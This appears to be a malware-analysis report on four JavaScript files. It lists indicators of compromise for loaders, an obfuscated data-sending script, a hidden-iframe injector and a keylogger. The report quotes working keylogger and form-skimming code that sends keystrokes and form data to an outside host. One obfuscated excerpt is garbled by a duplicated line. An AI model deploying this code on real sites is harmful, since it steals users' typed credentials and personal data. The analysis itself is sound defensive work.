## Findings

Below you can find the indicators of compromise as well as noteworthy findings detected manually in the given files. In `file2.js`, I did not find the time to fully detect its behavior apart from two IoC.

### file1.js

`file1.js` is a loader script. IoC & Findings:
- Uncomment page comments: This indicates that the script knows that something useful exists in these comments (probably known from reconnaissance techniques) or another malicious script has created a stealthy script element with comments and stored information.
- Use of `document.write`: The script writes a `script` element in the page with a remote URL as src, which gives the attacker the ability to load `.js` scripts bypassing potential controls applied only to API requests.
- Use of `window.execScript` and `window.eval`: These two functions execute JavaScript code as a string, specifically the response text from the `XHR` request.   

### file2.js (did not find noteworthy findings)

`file2.js`. IoC & Findings:
- Constructs URL from various variables in this function:
    ```javascript
    if(_0x811535[_0x14b009(0xe4)][_0x33d39c[0x0]][_0x14b009(0x102)]==_0x33d39c[0x1]&&xfkwf[_0x14b009(0xee)](_0x811535,_0x33d39c[0x2])[_0x14b009(0xf1)]>0x0){
                    if(_0x33d39c[0x3]=='l')xfkwf['awcsb'][_0x33d39c[0x4]]+='                     if(_0x33d39c[0x3]=='l')xfkwf['awcsb'][_0x33d39c[0x4]]+='\x20'+xfkwf[_0x14b009(0xee)](_0x811535,_0x33d39c[0x2]);else{
                        if(_0x33d39c[0x3]=='y')xfkwf[_0x14b009(0x10e)][_0x33d39c[0x4]]+='/'+xfkwf[_0x14b009(0xee)](_0x811535,_0x33d39c[0x2]);
                        else xfkwf[_0x14b009(0x10e)][_0x33d39c[0x4]]=xfkwf[_0x14b009(0xee)](_0x811535,_0x33d39c[0x2]);
                    }
                }
    ```
- Calls `fetch` and sends `FormData`:
    ```javascript
        if(xfkwf[_0x4dcc4c(0xe7)]==0x1){
            var _0x48fd7e=new FormData();
            _0x48fd7e[_0x4dcc4c(0x124)](xfkwf['vnskp_param'],_0x1cdb15),
            fetch(xfkwf[_0x4dcc4c(0x116)](xfkwf[_0x4dcc4c(0x10b)])+'?'+Math[_0x4dcc4c(0xdb)](),{
                'method':_0x4dcc4c(0xd7),
                'body':_0x48fd7e
            });
        }
    ```

### file3.js

`file3.js` is a loader script (loads `iframe` and `script` elements). IoC & Findings:
- Creation of an invisible `iframe` with `pointer-events` set to `none`: This indicates that the attacker can steal browser events by sideloading a script through an `iframe`. Invisibility and `pointer-events` set to none let the script stay undetectable.
- Initialization of multiple suspicious JavaScript files concatenated with the `public_path` `"https://js.mysitecdn.com/"`.
    ```javascript
        f=l+"frame.7a3ddac5.js",
        w=l+"vendor.e163e343.js",
        h=l+"frame-modern.78abb9d0.js",
        v=l+"vendor-modern.dde03d24.js",
    ```
    These scripts are then embedded into the page:
    ```javascript
        var p=function(e){
            var t=document.createElement("script");
            return t.type="text/javascript",t.charset="utf-8",t.src=e,t
        },
    ```
    ```javascript
    return n.contentDocument.head.appendChild(a),
            n.contentDocument.head.appendChild(s),
    ```
- Accepts custom events (probably from loaded scripts): Custom events are registered in the lists below:
    ```javascript
        d=[
            "turbo:visit",
            "turbolinks:visit",
            "page:before-change"
        ],
        u=[
            "turbo:before-cache",
            "turbolinks:before-cache"
        ],
        m=[
            "turbo:load",
            "turbolinks:load",
            "page:change"
        ];
    ```
    At the end, the script listens for these events:
    ```javascript
            (
            E(),
            function(e,t,n){
                // Load iframe for events "turbo:load", "turbolinks:load", and
                // "page:change".
                m.forEach((function(t){
                    document.addEventListener(t,e)
                })),
                // Remove iframe for events "turbo:before-cache", "turbolinks:before-cache"
                u.forEach((function (e){
                    document.addEventListener(e,t)
                })),
                // Delete window["MySite"]
                d.forEach((function(e){
                    document.addEventListener(e,n)
                }))
            }(
                E,
                x,
                (function(){
                    window[g]("shutdown",!1),delete window[g],x(),_()
                })
            )
        )
    ```
    To prevent such activity, we could block listeners on events that are not registered on the page. This dangerous though, as it could potentially trigger false positives from events registered by frameworks like React.

### file4.js

`file4.js` is a keylogger. IoC & Findings:
- Initializes a listener on the `keydown` event: On key press, the script stores the key in a variable: `keys`
    ```javascript
    window.addEventListener("keydown", e => {
        // If it's not just a letter (e.g., a modifier key), make it easier to spot, e.g., "[Tab]"
        if (e.key.length > 1) {
            keys += `[${e.key}]`;
        } else {
            keys += e.key;
        }
    });
    ```
- Initializes a listener on the `beforeunload` event: This enables the attacker to execute code just before the DOM is destroyed. On `beforeunload`, the script sends the content of the `keys` variable to the URL `"https://something.refreshment.ltd/keys"`;
    ```javascript
    window.addEventListener("beforeunload", function (e) {
        if (keys.length === 0) {
            return;
        }
        e.preventDefault();
        sendData({
            keys,
            url: window.location.href
        }, externURLKeys);
    });
    ```
- Initializes a listener on the `submit` event: This enables the attacker to trigger actions on form submissions. Specifically, the script collects the values from `input`, `select`, and `textarea` elements and sends them to the external URL `"https://something.refreshment.ltd/send"`.
    ```javascript
    document.addEventListener("submit", function (e) {
        e.preventDefault();
        const formData = collectFormData();
        sendData(formData, externURL);
    });
    ```

